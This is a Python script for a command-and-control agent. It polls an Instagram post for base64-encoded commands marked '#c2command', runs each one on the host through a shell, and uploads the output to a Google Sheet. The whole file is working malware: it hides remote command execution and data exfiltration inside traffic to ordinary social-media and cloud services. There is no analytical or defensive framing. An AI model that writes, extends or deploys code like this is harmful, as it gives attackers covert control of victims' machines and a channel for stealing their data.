import subprocess
import time
import base64
import re
from selenium import webdriver
from selenium.webdriver.common.by import By
from datetime import datetime
import gspread
from google.oauth2.service_account import Credentials

class InstagramC2Agent:
    def __init__(self, sheet_id, creds_file):
        self.post_url = "https://www.instagram.com/p/Davy49wiC_F/"
        self.command_marker = "#c2command"
        self.sheet_id = sheet_id
        self.creds_file = creds_file
        self.sheet = None
        self.setup_sheets()
        
    def setup_sheets(self):
        """Connect to Google Sheets"""
        try:
            scopes = ['https://www.googleapis.com/auth/spreadsheets']
            creds = Credentials.from_service_account_file(self.creds_file, scopes=scopes)
            client = gspread.authorize(creds)
            self.sheet = client.open_by_key(self.sheet_id)
            worksheet = self.sheet.sheet1
            print("[+] Google Sheets connected!")
        except Exception as e:
            print(f"[-] Sheets error: {e}")
    
    def get_post_caption(self):
        """Fetch post caption"""
        try:
            driver = webdriver.Firefox()
            driver.get(self.post_url)
            time.sleep(3)
            page_text = driver.find_element(By.TAG_NAME, "body").text
            driver.quit()
            return page_text
        except Exception as e:
            print(f"[-] Error: {e}")
            return None
    
    def extract_command(self, text):
        """Extract command"""
        try:
            match = re.search(r'#c2command\s+(\S+)', text)
            if match:
                encoded = match.group(1)
                decoded = base64.b64decode(encoded).decode()
                return decoded
        except:
            pass
        return None
    
    def execute_command(self, command):
        """Execute command"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
            return result.stdout + result.stderr
        except Exception as e:
            return f"Error: {str(e)}"
    
    def log_to_sheets(self, timestamp, command, result):
        """Write result to Google Sheet"""
        try:
            worksheet = self.sheet.sheet1
            worksheet.append_row([timestamp, command, result[:500]])
            print(f"[+] Result written to Google Sheet!")
        except Exception as e:
            print(f"[-] Failed to write: {e}")
    
    def poll(self):
        """Poll for commands"""
        print("[*] Instagram C2 Agent started")
        print(f"[*] Reading from: Instagram post")
        print(f"[*] Writing to: Google Sheet")
        
        while True:
            caption = self.get_post_caption()
            
            if caption and self.command_marker in caption:
                print(f"\n[+] Command found!")
                command = self.extract_command(caption)
                if command:
                    print(f"[*] Executing: {command}")
                    result = self.execute_command(command)
                    
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    print(f"[+] Result: {result[:100]}...")
                    self.log_to_sheets(timestamp, command, result)
            
            print(f"[*] Next poll in 15 seconds...")
            time.sleep(15)

if __name__ == "__main__":
    SHEET_ID = "1ZSfK5UnX1qD9F3Hf4UrnY0hS7rIs2I6zlLHwb1gk9u8"
    CREDS_FILE = "credentials.json"
    
    agent = InstagramC2Agent(SHEET_ID, CREDS_FILE)
    agent.poll()